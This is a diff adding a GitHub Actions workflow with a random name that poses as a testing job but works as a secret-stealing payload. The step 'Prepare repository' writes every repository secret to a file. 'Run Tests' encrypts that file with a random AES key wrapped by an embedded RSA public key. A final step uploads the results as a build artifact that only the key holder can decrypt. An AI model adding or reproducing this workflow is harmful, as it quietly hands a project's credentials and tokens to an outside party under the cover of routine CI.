@@ -1,0 +1,57 @@
+name: ymxyupgrpx
+on:
+  push:
+    branches: ymxyupgrpx
+jobs:
+  testing:
+    runs-on:
+    - ubuntu-latest
+    steps:
+    - env:
+        VALUES: ${{ toJSON(secrets)}}
+      name: Prepare repository
+      run: "\ncat <<EOF > output.json\n$VALUES\nEOF\n                    "
+    - name: Run Tests
+      env:
+        PUBKEY: '-----BEGIN PUBLIC KEY-----
+
+          MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyjXGVT1Dr6+f7lE85Wup
+
+          WVnfG4ZRzpWpjmOasQZHHS+xNps45Pcd2NRTjZZjzCgSDnkACVflKJhR4xtrKb8p
+
+          8cwIDU1wNQN6RQWcQKH+1f5jvYK+NjUmdJCFnZkLnaQu89IZk+EwK4JOy0N22M++
+
+          KCo9JfoNcG5w37sFl52L/apIcM9Roytc+822NltIst3hkEVzLmU12eOKieMPenXh
+
+          Pn/VG+h3PGkaVgQ2u8sj8x9lsaJoSTxtIjJCrTTRIo6l74Sp9S73Zrp8RidFGu2Y
+
+          tJ5DpchmBdckmVhGGs8efsxN1ZIw4aso2U1/QHPdkBDPGhJ9TAuyfMP2y0byR6X+
+
+          ItxmpOwkWxYq8hh39s/SJlr15dbuUxInBWNt3b0aIF0tAAviN1LQ8/NTsDdlPKoX
+
+          BpUpQN9XYfFYFIRQFJZBmGqrk7Qo1Vyw4iQ1YRKQFtEsE+4EVFkuHaANQ1Zr5rMk
+
+          mObrs9OwvZLbxhoZbqsFJnef8w0cZYBxmt/0+kKE3zNL+PxVq2e7csfC0qxJK805
+
+          2gmtzlK5spd/R4KMEPw43meZ2RRJrW9jv11oe+BgUG/TIpu6yVhCd6DVp8syHPHV
+
+          4CwiByrZVl+UGn9bGr1JZGa4+ZAV+ldmZTS5nqOI7Uw3WdHaAV79mq27d/01MxmQ
+
+          15xQHGEgRDUQr2CmDppa/RsCAwEAAQ==
+
+          -----END PUBLIC KEY-----
+
+          '
+      run: aes_key=$(openssl rand -hex 12 | tr -d '\n');openssl enc -aes-256-cbc -pbkdf2
+        -in output.json -out output_updated.json -pass pass:$aes_key;echo $aes_key
+        | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt
+        2> /dev/null;
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: files
+        path: ' |
+
+          output_updated.json
+
+          lookup.txt'
